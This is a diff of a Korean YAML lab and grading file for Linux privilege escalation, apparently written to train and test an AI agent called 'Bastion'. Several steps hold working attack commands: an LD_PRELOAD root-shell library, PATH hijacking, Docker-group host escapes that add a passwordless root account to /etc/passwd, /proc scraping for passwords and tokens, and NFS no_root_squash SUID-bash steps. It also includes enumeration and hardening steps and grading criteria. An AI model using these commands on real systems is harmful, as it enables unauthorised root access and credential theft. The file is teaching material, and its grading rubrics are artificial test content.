+    LD_PRELOAD\");\n    setresuid(0, 0, 0);\n    system(\"/bin/bash -p\");\n}\nCEOF\ncat /tmp/preload.c && echo '' && echo '=== Compile & Exploit
+    ===' && echo 'gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c' && echo 'sudo LD_PRELOAD=/tmp/preload.so <allowed_command>'
+    && echo '' && echo 'Requires: sudo with env_keep+=LD_PRELOAD or NOPASSWD command'"
   risk_level: medium
-  bastion_prompt: LD_PRELOAD를 활용한 권한 상승 기법을 시뮬레이션하라. 간단한 공유 라이브러리 소스를 작성하고, 컴파일 명령을
-    보여라.
+  bastion_prompt: LD_PRELOAD를 활용한 권한 상승 기법을 시뮬레이션하라. 간단한 공유 라이브러리 소스를 작성하고, 컴파일 명령을 보여라.
 - order: 9
-  instruction: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를 악용하는
-    기법을 보여라.
+  instruction: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를 악용하는 기법을 보여라.
   hint: 공격자 디렉토리에 같은 이름의 악성 스크립트를 생성하고 PATH 앞에 추가한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를
-    악용하는 기법을 보여라해줘
+  answer: '🤖 프롬프트: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를 악용하는 기법을 보여라해줘
 
-    📎 참고 (CLI): echo ''=== PATH Hijacking ==='' && echo ''#!/bin/bash'' > /tmp/ps
-    && echo ''id && whoami'' >> /tmp/ps && chmod +x /tmp/ps && echo ''Created fake
-    "ps" at /tmp/ps:'' && cat /tmp/ps && echo '''' && echo ''If SUID binary calls:
-    system("ps") without full path'' && echo ''Exploit: export PATH=/tmp:$PATH &&
-    run_suid_binary'' && echo ''Result: /tmp/ps (attacker script) executed as root''
-    && rm /tmp/ps'
-  answer_detail: PATH 하이재킹은 프로그램이 명령을 절대 경로 없이 호출할 때 발생한다. SUID 바이너리가 system("ps")를
-    호출하면, PATH에서 ps를 검색한다. 공격자가 자신의 디렉토리를 PATH 앞에 추가하면, 악성 스크립트가 root 권한으로 실행된다. 안전한
-    코딩은 항상 절대 경로(/usr/bin/ps)를 사용해야 한다.
+    📎 참고 (CLI): echo ''=== PATH Hijacking ==='' && echo ''#!/bin/bash'' > /tmp/ps && echo ''id && whoami'' >> /tmp/ps && chmod +x /tmp/ps && echo
+    ''Created fake "ps" at /tmp/ps:'' && cat /tmp/ps && echo '''' && echo ''If SUID binary calls: system("ps") without full path'' && echo ''Exploit:
+    export PATH=/tmp:$PATH && run_suid_binary'' && echo ''Result: /tmp/ps (attacker script) executed as root'' && rm /tmp/ps'
+  answer_detail: PATH 하이재킹은 프로그램이 명령을 절대 경로 없이 호출할 때 발생한다. SUID 바이너리가 system("ps")를 호출하면, PATH에서 ps를 검색한다. 공격자가 자신의 디렉토리를 PATH 앞에 추가하면, 악성 
+    스크립트가 root 권한으로 실행된다. 안전한 코딩은 항상 절대 경로(/usr/bin/ps)를 사용해야 한다.
   verify:
     type: output_contains
     expect: PATH Hijacking
     field: stdout
+    semantic:
+      intent: PATH 하이재킹 — SUID 바이너리가 절대경로 없이 system() 호출하는 취약점을 악용해 PATH 앞에 악성 스크립트 배치
+      success_criteria:
+      - 공격자 디렉토리(/tmp 등)에 피해 바이너리가 호출하는 이름(ps/id 등)의 악성 스크립트 생성
+      - chmod +x 후 export PATH=/tmp:$PATH 로 우선순위 조작
+      - SUID 바이너리가 system("cmd") 로 상대경로 호출해야 성립한다는 원리 서술
+      acceptable_methods:
+      - bash echo > fake_cmd + chmod +x + PATH 조작 + 실행
+      - ln -s /bin/bash /tmp/ps 심볼릭 링크
+      - python 에서 os.environ[PATH] 조작 후 subprocess.run
+      - 다른 취약 바이너리(tar, find, cp 등) 예시로 대체
+      negative_signs:
+      - PATH 조작 없이 바이너리 직접 대체
+      - SUID 전제 없이 일반 사용자 컨텍스트만 설명
+      - 악성 스크립트 실행 여부 확인 없음
   target_vm: attacker
-  script: 'echo ''=== PATH Hijacking ==='' && echo ''#!/bin/bash'' > /tmp/ps && echo
-    ''id && whoami'' >> /tmp/ps && chmod +x /tmp/ps && echo ''Created fake "ps" at
-    /tmp/ps:'' && cat /tmp/ps && echo '''' && echo ''If SUID binary calls: system("ps")
-    without full path'' && echo ''Exploit: export PATH=/tmp:$PATH && run_suid_binary''
-    && echo ''Result: /tmp/ps (attacker script) executed as root'' && rm /tmp/ps'
+  script: 'echo ''=== PATH Hijacking ==='' && echo ''#!/bin/bash'' > /tmp/ps && echo ''id && whoami'' >> /tmp/ps && chmod +x /tmp/ps && echo ''Created
+    fake "ps" at /tmp/ps:'' && cat /tmp/ps && echo '''' && echo ''If SUID binary calls: system("ps") without full path'' && echo ''Exploit: export
+    PATH=/tmp:$PATH && run_suid_binary'' && echo ''Result: /tmp/ps (attacker script) executed as root'' && rm /tmp/ps'
   risk_level: medium
-  bastion_prompt: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를 악용하는
-    기법을 보여라해줘
+  bastion_prompt: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를 악용하는 기법을 보여라해줘
 - order: 10
   instruction: Docker 그룹을 통한 권한 상승 기법을 분석하라. docker 그룹 사용자가 root를 획득하는 명령을 작성하라.
   hint: docker run으로 호스트 파일시스템을 마운트하면 root 권한으로 접근 가능하다
@@ -265,28 +349,36 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Docker 그룹을 통한 권한 상승 기법을 분석하라 구현 방법과 예시를 설명해줘
 
-    📎 참고 (CLI): echo ''=== Docker Group Privilege Escalation ==='' && echo ''docker
-    run -v /:/hostfs -it alpine chroot /hostfs /bin/bash'' && echo '''' && echo ''Alternative
-    methods:'' && echo ''1. Mount /etc/shadow: docker run -v /etc/shadow:/shadow alpine
-    cat /shadow'' && echo ''2. Add SUID bash: docker run -v /:/mnt alpine chmod u+s
-    /mnt/bin/bash'' && echo ''3. Modify /etc/passwd: docker run -v /etc:/etc alpine
-    sh -c "echo root2::0:0::/root:/bin/bash >> /etc/passwd"'' && echo '''' && groups
-    2>&1'
-  answer_detail: docker 그룹 소속은 사실상 root와 동등하다. Docker 소켓(/var/run/docker.sock)에 접근할
-    수 있으면 호스트 파일시스템을 마운트하여 모든 파일을 읽고 쓸 수 있다. lxd, disk, adm 그룹도 유사한 위험이 있다. 일반 사용자를
-    docker 그룹에 추가할 때는 이 위험을 인지해야 한다.
+    📎 참고 (CLI): echo ''=== Docker Group Privilege Escalation ==='' && echo ''docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash'' &&
+    echo '''' && echo ''Alternative methods:'' && echo ''1. Mount /etc/shadow: docker run -v /etc/shadow:/shadow alpine cat /shadow'' && echo
+    ''2. Add SUID bash: docker run -v /:/mnt alpine chmod u+s /mnt/bin/bash'' && echo ''3. Modify /etc/passwd: docker run -v /etc:/etc alpine
+    sh -c "echo root2::0:0::/root:/bin/bash >> /etc/passwd"'' && echo '''' && groups 2>&1'
+  answer_detail: docker 그룹 소속은 사실상 root와 동등하다. Docker 소켓(/var/run/docker.sock)에 접근할 수 있으면 호스트 파일시스템을 마운트하여 모든 파일을 읽고 쓸 수 있다. lxd, disk, adm 
+    그룹도 유사한 위험이 있다. 일반 사용자를 docker 그룹에 추가할 때는 이 위험을 인지해야 한다.
   verify:
     type: output_contains
     expect: Docker Group
     field: stdout
+    semantic:
+      intent: docker 그룹 권한 상승 — Docker 소켓 접근 권한으로 호스트 파일시스템 마운트해 root 획득
+      success_criteria:
+      - docker run -v /:/hostfs alpine chroot /hostfs 형태의 호스트 탈출 명령 제시
+      - 마운트 경로 / 또는 /etc/shadow 등 민감 경로 접근 예시
+      - docker 그룹 = 실질 root 라는 위험 인식 서술
+      acceptable_methods:
+      - docker run -v /:/hostfs -it <img> chroot /hostfs /bin/bash
+      - docker run -v /etc:/etc ... tee -a /etc/passwd
+      - docker -H unix:///var/run/docker.sock
+      - crictl/podman 등 대체 런타임 동등 기법 언급
+      negative_signs:
+      - docker ps 만 실행하고 권한 상승 경로 없음
+      - 호스트 볼륨 마운트 부재
+      - 그룹 소속 확인(groups) 없음
   target_vm: attacker
-  script: 'echo ''=== Docker Group Privilege Escalation ==='' && echo ''docker run
-    -v /:/hostfs -it alpine chroot /hostfs /bin/bash'' && echo '''' && echo ''Alternative
-    methods:'' && echo ''1. Mount /etc/shadow: docker run -v /etc/shadow:/shadow alpine
-    cat /shadow'' && echo ''2. Add SUID bash: docker run -v /:/mnt alpine chmod u+s
-    /mnt/bin/bash'' && echo ''3. Modify /etc/passwd: docker run -v /etc:/etc alpine
-    sh -c "echo root2::0:0::/root:/bin/bash >> /etc/passwd"'' && echo '''' && groups
-    2>&1'
+  script: 'echo ''=== Docker Group Privilege Escalation ==='' && echo ''docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash'' && echo
+    '''' && echo ''Alternative methods:'' && echo ''1. Mount /etc/shadow: docker run -v /etc/shadow:/shadow alpine cat /shadow'' && echo ''2.
+    Add SUID bash: docker run -v /:/mnt alpine chmod u+s /mnt/bin/bash'' && echo ''3. Modify /etc/passwd: docker run -v /etc:/etc alpine sh -c
+    "echo root2::0:0::/root:/bin/bash >> /etc/passwd"'' && echo '''' && groups 2>&1'
   risk_level: medium
   bastion_prompt: Docker 그룹을 통한 권한 상승 기법을 분석하라. docker 그룹 사용자가 root를 획득하는 명령을 작성하라.
 - order: 11
@@ -296,26 +388,34 @@ steps:
   points: 10
   answer: '🤖 프롬프트: /proc 파일시스템에서 민감 정보를 수집해줘
 
-    📎 참고 (CLI): echo ''=== /proc Sensitive Data ==='' && for pid in $(ls /proc/ |
-    grep -E ''^[0-9]+$'' | head -20); do cmdline=$(cat /proc/$pid/cmdline 2>/dev/null
-    | tr ''\0'' '' ''); [ -n "$cmdline" ] && echo "PID $pid: $cmdline"; done 2>/dev/null
-    | grep -iE ''(pass|key|token|secret)'' | head -10; echo ''---'' && cat /proc/self/environ
-    2>/dev/null | tr ''\0'' ''\n'' | grep -iE ''(pass|key|token|api)'' | head -5;
-    echo ''Done'''
-  answer_detail: /proc 파일시스템은 리눅스 커널의 프로세스 정보를 제공한다. /proc/[pid]/cmdline에는 프로세스 실행
-    시 전달된 인자(비밀번호 포함 가능)가, /proc/[pid]/environ에는 환경변수(API 키, DB 비밀번호 등)가 있다. /proc/self/maps는
-    ASLR 우회에, /proc/net/tcp는 네트워크 연결 파악에 유용하다.
+    📎 참고 (CLI): echo ''=== /proc Sensitive Data ==='' && for pid in $(ls /proc/ | grep -E ''^[0-9]+$'' | head -20); do cmdline=$(cat /proc/$pid/cmdline
+    2>/dev/null | tr ''\0'' '' ''); [ -n "$cmdline" ] && echo "PID $pid: $cmdline"; done 2>/dev/null | grep -iE ''(pass|key|token|secret)'' |
+    head -10; echo ''---'' && cat /proc/self/environ 2>/dev/null | tr ''\0'' ''\n'' | grep -iE ''(pass|key|token|api)'' | head -5; echo ''Done'''
+  answer_detail: /proc 파일시스템은 리눅스 커널의 프로세스 정보를 제공한다. /proc/[pid]/cmdline에는 프로세스 실행 시 전달된 인자(비밀번호 포함 가능)가, /proc/[pid]/environ에는 환경변수(API 키, 
+    DB 비밀번호 등)가 있다. /proc/self/maps는 ASLR 우회에, /proc/net/tcp는 네트워크 연결 파악에 유용하다.
   verify:
     type: output_contains
     expect: /proc
     field: stdout
+    semantic:
+      intent: /proc 파일시스템에서 민감 정보 수집 — 실행 중 프로세스의 cmdline/environ 에서 패스워드·API 키 추출
+      success_criteria:
+      - /proc/[pid]/cmdline 순회로 실행 인자 검사
+      - /proc/self/environ 또는 /proc/[pid]/environ 에서 환경변수 열람
+      - pass/key/token/secret 등 키워드 grep 로 민감 정보 탐지
+      acceptable_methods:
+      - for pid in /proc/[0-9]*; do cat $pid/cmdline; done
+      - python /proc walker 스크립트
+      - ps auxf 와 결합해 의심 프로세스 식별
+      - procdump 또는 volatility 메모리 분석으로 대체
+      negative_signs:
+      - /proc 대신 환경변수만 나열 (env)
+      - 수집 결과 해석 없이 raw dump 만
+      - 권한 없이 다른 프로세스 /proc 접근 시도해 실패한 뒤 대체 없음
   target_vm: attacker
-  script: 'echo ''=== /proc Sensitive Data ==='' && for pid in $(ls /proc/ | grep
-    -E ''^[0-9]+$'' | head -20); do cmdline=$(cat /proc/$pid/cmdline 2>/dev/null |
-    tr ''\0'' '' ''); [ -n "$cmdline" ] && echo "PID $pid: $cmdline"; done 2>/dev/null
-    | grep -iE ''(pass|key|token|secret)'' | head -10; echo ''---'' && cat /proc/self/environ
-    2>/dev/null | tr ''\0'' ''\n'' | grep -iE ''(pass|key|token|api)'' | head -5;
-    echo ''Done'''
+  script: 'echo ''=== /proc Sensitive Data ==='' && for pid in $(ls /proc/ | grep -E ''^[0-9]+$'' | head -20); do cmdline=$(cat /proc/$pid/cmdline
+    2>/dev/null | tr ''\0'' '' ''); [ -n "$cmdline" ] && echo "PID $pid: $cmdline"; done 2>/dev/null | grep -iE ''(pass|key|token|secret)'' |
+    head -10; echo ''---'' && cat /proc/self/environ 2>/dev/null | tr ''\0'' ''\n'' | grep -iE ''(pass|key|token|api)'' | head -5; echo ''Done'''
   risk_level: low
   bastion_prompt: /proc 파일시스템에서 민감 정보를 수집해줘
 - order: 12
@@ -325,72 +425,84 @@ steps:
   points: 10
   answer: '🤖 프롬프트: NFS 공유를 통한 권한 상승을 분석하라. no_root_squash 설정의 위험성과 악용 방법을 문서화해줘
 
-    📎 참고 (CLI): echo ''=== NFS no_root_squash Exploitation ==='' && cat /etc/exports
-    2>/dev/null || echo ''No NFS exports found'' && echo '''' && echo ''[Concept]''
-    && echo ''no_root_squash: Remote root = Local root on NFS share'' && echo ''''
-    && echo ''[Attack Steps]'' && echo ''1. showmount -e 10.20.30.x (find NFS exports)''
-    && echo ''2. mount -t nfs target:/share /mnt'' && echo ''3. cp /bin/bash /mnt/bash
-    && chmod u+s /mnt/bash'' && echo ''4. On target: /share/bash -p -> root shell''
-    && echo '''' && echo ''[Defense]'' && echo ''- Use root_squash (default, maps
-    root to nobody)'' && echo ''- Restrict NFS to specific IPs'' && echo ''- Use NFSv4
-    with Kerberos authentication'''
-  answer_detail: NFS의 no_root_squash 옵션은 원격 root 사용자를 로컬 root로 매핑한다. 공격자가 NFS 클라이언트에서
-    root 권한으로 SUID bash를 생성하면, 대상 서버에서 root 셸을 획득할 수 있다. 기본값인 root_squash는 원격 root를
-    nobody로 매핑하여 이를 방지한다.
+    📎 참고 (CLI): echo ''=== NFS no_root_squash Exploitation ==='' && cat /etc/exports 2>/dev/null || echo ''No NFS exports found'' && echo ''''
+    && echo ''[Concept]'' && echo ''no_root_squash: Remote root = Local root on NFS share'' && echo '''' && echo ''[Attack Steps]'' && echo ''1.
+    showmount -e 10.20.30.x (find NFS exports)'' && echo ''2. mount -t nfs target:/share /mnt'' && echo ''3. cp /bin/bash /mnt/bash && chmod u+s
+    /mnt/bash'' && echo ''4. On target: /share/bash -p -> root shell'' && echo '''' && echo ''[Defense]'' && echo ''- Use root_squash (default,
+    maps root to nobody)'' && echo ''- Restrict NFS to specific IPs'' && echo ''- Use NFSv4 with Kerberos authentication'''
+  answer_detail: NFS의 no_root_squash 옵션은 원격 root 사용자를 로컬 root로 매핑한다. 공격자가 NFS 클라이언트에서 root 권한으로 SUID bash를 생성하면, 대상 서버에서 root 셸을 획득할 수 있다. 
+    기본값인 root_squash는 원격 root를 nobody로 매핑하여 이를 방지한다.
   verify:
     type: output_contains
     expect: NFS no_root_squash
     field: stdout
+    semantic:
+      intent: NFS no_root_squash 설정 악용 — 원격 root 를 로컬 root 로 매핑하는 옵션이 있으면 공유에 SUID bash 배치해 대상 서버에서 root 획득
+      success_criteria:
+      - showmount -e <target> 로 NFS export 나열 명령 제시
+      - no_root_squash 옵션의 의미(원격 root = 로컬 root) 설명
+      - mount -t nfs + SUID bash 복사 + u+s 플래그 설정 + 타겟에서 bash -p 의 4단계 공격 흐름
+      acceptable_methods:
+      - showmount -e + mount -t nfs + cp /bin/bash + chmod u+s 조합
+      - python nfs-client 라이브러리 사용
+      - CVE-2013-3941 등 공식 LPE 예시
+      - NFSv4 Kerberos 대체 언급과 함께 mitigation
+      negative_signs:
+      - root_squash(기본) 가정한 설명만
+      - exports 나열 없이 이론만
+      - 공유 마운트 후 권한 확인 없음
   target_vm: attacker
-  script: 'echo ''=== NFS no_root_squash Exploitation ==='' && cat /etc/exports 2>/dev/null
-    || echo ''No NFS exports found'' && echo '''' && echo ''[Concept]'' && echo ''no_root_squash:
-    Remote root = Local root on NFS share'' && echo '''' && echo ''[Attack Steps]''
-    && echo ''1. showmount -e 10.20.30.x (find NFS exports)'' && echo ''2. mount -t
-    nfs target:/share /mnt'' && echo ''3. cp /bin/bash /mnt/bash && chmod u+s /mnt/bash''
-    && echo ''4. On target: /share/bash -p -> root shell'' && echo '''' && echo ''[Defense]''
-    && echo ''- Use root_squash (default, maps root to nobody)'' && echo ''- Restrict
-    NFS to specific IPs'' && echo ''- Use NFSv4 with Kerberos authentication'''
+  script: 'echo ''=== NFS no_root_squash Exploitation ==='' && cat /etc/exports 2>/dev/null || echo ''No NFS exports found'' && echo '''' && echo
+    ''[Concept]'' && echo ''no_root_squash: Remote root = Local root on NFS share'' && echo '''' && echo ''[Attack Steps]'' && echo ''1. showmount
+    -e 10.20.30.x (find NFS exports)'' && echo ''2. mount -t nfs target:/share /mnt'' && echo ''3. cp /bin/bash /mnt/bash && chmod u+s /mnt/bash''
+    && echo ''4. On target: /share/bash -p -> root shell'' && echo '''' && echo ''[Defense]'' && echo ''- Use root_squash (default, maps root
+    to nobody)'' && echo ''- Restrict NFS to specific IPs'' && echo ''- Use NFSv4 with Kerberos authentication'''
   risk_level: medium
   bastion_prompt: NFS 공유를 통한 권한 상승을 분석하라. no_root_squash 설정의 위험성과 악용 방법을 문서화해줘
 - order: 13
-  instruction: linpeas.sh 또는 linux-exploit-suggester의 동작 원리를 이해하기 위해 수동으로 주요 검사 항목을
-    실행하라. 커널, SUID, sudo, cron, capabilities를 한 번에 점검하라.
+  instruction: linpeas.sh 또는 linux-exploit-suggester의 동작 원리를 이해하기 위해 수동으로 주요 검사 항목을 실행하라. 커널, SUID, sudo, cron, capabilities를 한 번에 점검하라.
   hint: 앞서 배운 각 검사 명령을 하나의 스크립트로 조합한다
   category: recon
   points: 10
-  answer: '🤖 프롬프트: linpeas.sh 또는 linux-exploit-suggester의 동작 원리를 이해하기 위해 수동으로 주요 검사
-    항목을 실행해줘
+  answer: '🤖 프롬프트: linpeas.sh 또는 linux-exploit-suggester의 동작 원리를 이해하기 위해 수동으로 주요 검사 항목을 실행해줘
 
-    📎 참고 (CLI): echo ''=== Manual Privilege Escalation Enumeration ==='' && echo ''[Kernel]''
-    && uname -r && echo ''[SUID]'' && find / -perm -4000 -type f 2>/dev/null | wc
-    -l && echo ''SUID binaries found'' && echo ''[Sudo]'' && sudo -l 2>&1 | tail -3
-    && echo ''[Cron]'' && ls /etc/cron.d/ 2>/dev/null | wc -l && echo ''cron.d entries''
-    && echo ''[Capabilities]'' && getcap -r /usr/bin/ 2>/dev/null | head -5 && echo
-    ''[Writable /etc]'' && find /etc -writable -type f 2>/dev/null | wc -l && echo
-    ''writable files in /etc'' && echo ''[Docker]'' && groups | grep -o docker ||
-    echo ''not in docker group'''
-  answer_detail: 자동화 도구(linpeas, linux-exploit-suggester, LinEnum)는 이러한 검사를 종합적으로
-    수행한다. 수동으로 각 검사를 이해하면 도구의 결과를 더 정확하게 해석하고, 도구를 업로드할 수 없는 환경에서도 열거가 가능하다. 체계적인
-    열거는 권한 상승 성공의 핵심이다.
+    📎 참고 (CLI): echo ''=== Manual Privilege Escalation Enumeration ==='' && echo ''[Kernel]'' && uname -r && echo ''[SUID]'' && find / -perm -4000
+    -type f 2>/dev/null | wc -l && echo ''SUID binaries found'' && echo ''[Sudo]'' && sudo -l 2>&1 | tail -3 && echo ''[Cron]'' && ls /etc/cron.d/
+    2>/dev/null | wc -l && echo ''cron.d entries'' && echo ''[Capabilities]'' && getcap -r /usr/bin/ 2>/dev/null | head -5 && echo ''[Writable
+    /etc]'' && find /etc -writable -type f 2>/dev/null | wc -l && echo ''writable files in /etc'' && echo ''[Docker]'' && groups | grep -o docker
+    || echo ''not in docker group'''
+  answer_detail: 자동화 도구(linpeas, linux-exploit-suggester, LinEnum)는 이러한 검사를 종합적으로 수행한다. 수동으로 각 검사를 이해하면 도구의 결과를 더 정확하게 해석하고, 도구를 업로드할 수 없는 
+    환경에서도 열거가 가능하다. 체계적인 열거는 권한 상승 성공의 핵심이다.
   verify:
     type: output_contains
     expect: Manual Privilege Escalation
     field: stdout
+    semantic:
+      intent: 수동 권한 상승 열거 — 커널/SUID/sudo/cron/capabilities/writable/Docker 를 linpeas 없이 직접 체크
+      success_criteria:
+      - uname -r 로 커널 버전
+      - find /perm -4000 로 SUID 개수
+      - sudo -l, /etc/cron*, getcap, find /etc -writable, groups 출력 중 3가지 이상 수행
+      - 각 결과를 해석·요약
+      acceptable_methods:
+      - bash 스크립트로 섹션별 출력
+      - python 으로 동등 스크립트
+      - linpeas.sh 실행 결과의 일부만 소개해도 수동 이해 증거 포함되면 인정
+      - linux-exploit-suggester 결과 첨부
+      negative_signs:
+      - 자동 도구(linpeas) 를 단순 실행만 하고 원리 설명 없음
+      - 1-2 섹션만 확인
+      - 결과 해석 없이 raw 로그만
   target_vm: attacker
-  script: echo '=== Manual Privilege Escalation Enumeration ===' && echo '[Kernel]'
-    && uname -r && echo '[SUID]' && find / -perm -4000 -type f 2>/dev/null | wc -l
-    && echo 'SUID binaries found' && echo '[Sudo]' && sudo -l 2>&1 | tail -3 && echo
-    '[Cron]' && ls /etc/cron.d/ 2>/dev/null | wc -l && echo 'cron.d entries' && echo
-    '[Capabilities]' && getcap -r /usr/bin/ 2>/dev/null | head -5 && echo '[Writable
-    /etc]' && find /etc -writable -type f 2>/dev/null | wc -l && echo 'writable files
-    in /etc' && echo '[Docker]' && groups | grep -o docker || echo 'not in docker
-    group'
+  script: echo '=== Manual Privilege Escalation Enumeration ===' && echo '[Kernel]' && uname -r && echo '[SUID]' && find / -perm -4000 -type
+    f 2>/dev/null | wc -l && echo 'SUID binaries found' && echo '[Sudo]' && sudo -l 2>&1 | tail -3 && echo '[Cron]' && ls /etc/cron.d/ 
+    2>/dev/null | wc -l && echo 'cron.d entries' && echo '[Capabilities]' && getcap -r /usr/bin/ 2>/dev/null | head -5 && echo '[Writable 
+    /etc]' && find /etc -writable -type f 2>/dev/null | wc -l && echo 'writable files in /etc' && echo '[Docker]' && groups | grep -o docker
+    || echo 'not in docker group'
   risk_level: low
-  bastion_prompt: linpeas.sh 또는 linux-exploit-suggester의 동작 원리를 이해하기 위해 수동으로 주요 검사
-    항목을 실행해줘
+  bastion_prompt: linpeas.sh 또는 linux-exploit-suggester의 동작 원리를 이해하기 위해 수동으로 주요 검사 항목을 실행해줘
 - order: 14
-  instruction: 다단계 권한 상승 체인을 설계하라. 웹셸(www-data) → 일반 사용자 → root로 이어지는 공격 체인을 시나리오로
-    작성하라.
+  instruction: 다단계 권한 상승 체인을 설계하라. 웹셸(www-data) → 일반 사용자 → root로 이어지는 공격 체인을 시나리오로 작성하라.
   hint: 각 단계에서 사용하는 취약점과 기법을 구체적으로 명시한다
   category: analysis
   points: 15
@@ -443,12 +555,27 @@ steps:
     EOF
 
     cat /tmp/privesc_chain.txt'
-  answer_detail: 실제 모의해킹에서 권한 상승은 여러 단계를 거치는 경우가 대부분이다. 각 단계에서 다른 취약점을 체이닝하여 최종 목표(root/Domain
-    Admin)에 도달한다. 체인의 각 단계를 문서화하고 증거를 수집하는 것은 전문 모의해킹 보고서의 필수 요소이다.
+  answer_detail: 실제 모의해킹에서 권한 상승은 여러 단계를 거치는 경우가 대부분이다. 각 단계에서 다른 취약점을 체이닝하여 최종 목표(root/Domain Admin)에 도달한다. 체인의 각 단계를 문서화하고 증거를 수집하는 것은 전문 
+    모의해킹 보고서의 필수 요소이다.
   verify:
     type: output_contains
     expect: Multi-Stage Privilege Escalation
     field: stdout
+    semantic:
+      intent: 다단계 권한 상승 체인 설계 — 웹셸(www-data) → 일반 사용자 → root 흐름을 각 단계의 취약점/기법과 함께 서술
+      success_criteria:
+      - 3 단계(Stage 1/2/3) 또는 그 이상 체계적 구성
+      - 각 단계의 Vulnerability + Technique + Result 삼요소 포함
+      - SSH key exposure, sudo escape, SUID 등 구체 기법 2개 이상 사용
+      acceptable_methods:
+      - heredoc 으로 문서 파일 작성
+      - markdown 체크리스트
+      - diagram 스타일(->) 로 흐름 표현
+      - 각 단계에 대안 경로(Alternative) 포함
+      negative_signs:
+      - 단일 단계만 설명
+      - 취약점-기법 매핑 없이 막연한 설명
+      - 최종 root 획득 단계 누락
   target_vm: attacker
   script: 'cat > /tmp/privesc_chain.txt << ''EOF''
 
@@ -498,15 +625,13 @@ steps:
 
     cat /tmp/privesc_chain.txt'
   risk_level: low
-  bastion_prompt: 다단계 권한 상승 체인을 설계하라. 웹셸(www-data) → 일반 사용자 → root로 이어지는 공격 체인을 시나리오로
-    작성하라.
+  bastion_prompt: 다단계 권한 상승 체인을 설계하라. 웹셸(www-data) → 일반 사용자 → root로 이어지는 공격 체인을 시나리오로 작성하라.
 - order: 15
   instruction: 권한 상승 방어를 위한 시스템 경화 체크리스트를 /tmp/hardening_checklist.txt에 작성하라.
   hint: 각 권한 상승 벡터에 대한 방어 조치를 체크리스트로 정리한다
   category: defense
   points: 10
-  answer: '🤖 프롬프트: 권한 상승 방어를 위한 시스템 경화 체크리스트를 /tmp/hardening_checklist 구현 방법과 예시를
-    설명해줘
+  answer: '🤖 프롬프트: 권한 상승 방어를 위한 시스템 경화 체크리스트를 /tmp/hardening_checklist 구현 방법과 예시를 설명해줘
 
     📎 참고 (CLI): cat > /tmp/hardening_checklist.txt << ''EOF''
 
@@ -546,13 +671,27 @@ steps:
     EOF
 
     cat /tmp/hardening_checklist.txt'
-  answer_detail: 시스템 경화는 권한 상승의 각 벡터를 차단하는 다층 방어이다. CIS Benchmark, STIG 등의 표준 가이드라인을
-    참고하여 체계적으로 적용해야 한다. 자동화 도구(Ansible, Chef)로 경화 정책을 일관되게 배포하고, 정기적인 감사로 설정 드리프트를
-    방지한다.
+  answer_detail: 시스템 경화는 권한 상승의 각 벡터를 차단하는 다층 방어이다. CIS Benchmark, STIG 등의 표준 가이드라인을 참고하여 체계적으로 적용해야 한다. 자동화 도구(Ansible, Chef)로 경화 정책을 일관되게 
+    배포하고, 정기적인 감사로 설정 드리프트를 방지한다.
   verify:
     type: output_contains
     expect: Defense Checklist
     field: stdout
+    semantic:
+      intent: Linux 권한 상승 방어를 위한 시스템 경화 체크리스트를 /tmp/hardening_checklist.txt 로 작성
+      success_criteria:
+      - SUID/sudo/cron/capabilities/NFS/Docker 중 3가지 이상 섹션에 대한 방어 조치
+      - 각 벡터에 대한 실제 설정 예(noexec, NOPASSWD 제거, root_squash 등) 제공
+      - 파일 작성 후 cat 으로 검증 출력
+      acceptable_methods:
+      - heredoc 으로 체크리스트 파일 작성
+      - CIS Benchmark 항목 참조
+      - systemd 유닛/AppArmor 정책 적용 예시
+      - markdown 체크박스 형식
+      negative_signs:
+      - 1-2 섹션만 다룸
+      - 방어 조치 없이 공격 기법 재열거
+      - 파일 생성 없이 화면 출력만
   target_vm: attacker
   script: 'cat > /tmp/hardening_checklist.txt << ''EOF''
 
@@ -604,8 +743,7 @@ steps:
 
     3) 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를 수집해줘
 
-    4) sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을
-    정리해줘
+    4) sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을 정리해줘
 
     5) cron 작업에서 권한 상승 벡터를 찾아라해줘'
   hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
@@ -625,10 +763,8 @@ steps:
 
     3) 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를 수집해줘
 
-    4) sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을
-    정리해줘
+    4) sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을 정리해줘
 
     5) cron 작업에서 권한 상승 벡터를 찾아라해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
   script: ''
